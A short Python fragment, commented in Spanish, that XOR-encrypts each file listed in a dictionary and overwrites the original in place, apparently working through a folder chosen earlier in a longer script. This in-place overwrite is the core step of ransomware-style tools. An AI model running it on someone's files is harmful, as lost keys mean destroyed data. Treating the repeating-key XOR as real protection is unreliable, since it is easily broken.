# funcion para encriptar los archivos del diccionario 'tokenized_dict'
def xor_encrypt(tokenized_dict):
    for filename,key in tokenized_dict.items():
        try:
            with open(filename,"rb") as file:
                data_content = file.read()
            
            key_bytes = bytearray(key, 'utf-8')
            encrypted_data = bytearray()
            for i,byte in enumerate(data_content):
                encrypted_data.append(byte ^ key_bytes[i % len(key_bytes)])
            
            with open(filename, 'wb') as encrypted:
                encrypted.write(encrypted_data)
                print(f"{filename} >> Encrypted ")
        except FileNotFoundError:
            print("ERROR FILE NOT FOUND")
# encripta los archivos de la carpeta seleccionada al principio
xor_encrypt(tokenized_dict)

